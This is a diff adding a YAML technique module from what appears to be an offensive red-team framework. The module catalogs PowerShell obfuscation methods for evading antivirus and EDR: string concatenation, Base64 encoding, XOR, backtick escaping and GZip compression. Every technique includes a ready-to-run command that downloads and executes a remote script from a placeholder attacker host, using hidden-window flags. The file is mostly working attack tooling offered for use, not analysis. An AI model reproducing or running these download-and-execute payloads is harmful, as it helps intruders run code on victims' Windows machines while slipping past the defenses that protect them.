@@ -1,0 +1,112 @@
+name: powershell_obfuscation
+version: "1.0"
+description: >
+  PowerShell obfuscation techniques to evade signature-based AV/EDR detection
+  by encoding, concatenating, and compressing payloads before execution.
+author: "LazyOwn RedTeam"
+category: "evasion"
+phase: "post_exploitation"
+permissions:
+  - shell
+platforms:
+  - windows
+enabled: true
+tags:
+  - powershell
+  - obfuscation
+  - evasion
+  - encoding
+  - av_bypass
+
+techniques:
+  - name: "String Concatenation Obfuscation"
+    description: >
+      Splits command strings into fragments and reassembles at runtime using concatenation.
+      Breaks static string matching signatures. Combine with variable renaming for stronger evasion.
+    requires_admin: false
+    command: |
+      $x = "I" + "nv" + "oke-E" + "xp" + "re" + "ss" + "ion"
+      $y = "Down" + "lo" + "ad" + "St" + "ring"
+      & (Get-Command $x) ((New-Object Net.WebClient).$y('http://' + 'att' + 'ack' + 'er.c' + 'om/p' + 'ayload'))
+    cleanup: >
+      Remove-Variable x,y -ErrorAction SilentlyContinue
+    references:
+      - "https://github.com/danielbohannon/Invoke-Obfuscation"
+      - "https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-constraints-av/"
+
+  - name: "Base64 Encoding with IEX"
+    description: >
+      Encodes the payload as a UTF-16LE Base64 string and executes via Invoke-Expression.
+      Standard PowerShell -EncodedCommand technique that bypasses command-line logging of plaintext.
+      Use with fragmented encoding to break base64 detection signatures.
+    requires_admin: false
+    command: |
+      $code = @'
+      IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')
+      '@
+      $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
+      $encoded = [Convert]::ToBase64String($bytes)
+      powershell -NoP -NonI -W Hidden -Enc $encoded
+    cleanup: >
+      Remove-Variable code,bytes,encoded -ErrorAction SilentlyContinue
+    references:
+      - "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe"
+      - "https://github.com/samratashok/nishang"
+
+  - name: "XOR Encoding — Single-Byte Key"
+    description: >
+      XOR-encodes the payload with a single-byte key. The decoder is included inline,
+      reconstructing the payload at runtime. Evades string-based signatures since
+      the original payload never appears in plaintext.
+    requires_admin: false
+    command: |
+      $key = 0x42
+      $payload = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/p.ps1')"
+      $encoded = [System.Text.Encoding]::UTF8.GetBytes($payload.ToCharArray()) | ForEach-Object { $_ -bxor $key }
+      $decoder = "`$k=0x42;`$d=[byte[]]@($([string]::Join(',', $encoded)));`$r='';0..(`$d.Length-1)|%{`$r+=[char](`$d[`$_] -bxor `$k)};IEX(`$r)"
+      powershell -NoP -NonI -W Hidden -C $decoder
+    cleanup: >
+      Remove-Variable key,payload,encoded,decoder -ErrorAction SilentlyContinue
+    references:
+      - "https://github.com/danielbohannon/Invoke-Obfuscation"
+      - "https://www.ired.team/offensive-security/code-execution/powershell-code-execution"
+
+  - name: "Character Replacement / Escape Obfuscation"
+    description: >
+      Uses PowerShell escape sequences, backtick insertion, and wildcard substitution
+      to break static signatures without encoding. Combines case-toggling with
+      whitespace injection for maximum signature evasion.
+    requires_admin: false
+    command: |
+      $c = "I`N`V`O`K`E-E`X`P`R`E`S`S`I`O`N"
+      $w = "`N`E`W-O`B`J`E`C`T"
+      $r = "`D`O`W`N`L`O`A`D`S`T`R`I`N`G"
+      $u = "h" + "tt" + "p://a" + "tt" + "acker.c" + "om/p"
+      & (Get-Command $c) ((& (Get-Command $w) Net.WebClient).$r($u))
+    cleanup: >
+      Remove-Variable c,w,r,u -ErrorAction SilentlyContinue
+    references:
+      - "https://github.com/danielbohannon/Invoke-Obfuscation"
+      - "https://speakerdeck.com/tweekfawkes/obfuscating-malicious-macro-enabled-documents"
+
+  - name: "Compression + Base64 — GZip Stream"
+    description: >
+      Compresses the payload using GZipStream, then Base64-encodes the compressed data.
+      The decoder decompresses in memory and pipes to IEX. Reduces payload size while
+      breaking both string and base64 signature detection.
+    requires_admin: false
+    command: |
+      $payload = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
+      $ms = New-Object System.IO.MemoryStream
+      $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
+      $sw = New-Object System.IO.StreamWriter($cs)
+      $sw.Write($payload)
+      $sw.Close()
+      $compressed = [Convert]::ToBase64String($ms.ToArray())
+      $decoder = "`$d=[Convert]::FromBase64String('$compressed');`$m=New-Object IO.MemoryStream(,`$d);`$g=New-Object IO.Compression.GZipStream(`$m,[IO.Compression.CompressionMode]::Decompress);`$r=New-Object IO.StreamReader(`$g);IEX(`$r.ReadToEnd())"
+      powershell -NoP -NonI -W Hidden -C $decoder
+    cleanup: >
+      $ms.Dispose(); $cs.Dispose(); $sw.Dispose()
+    references:
+      - "https://github.com/danielbohannon/Invoke-Obfuscation"
+      - "https://www.ired.team/offensive-security/code-execution/powershell-without-powershell"
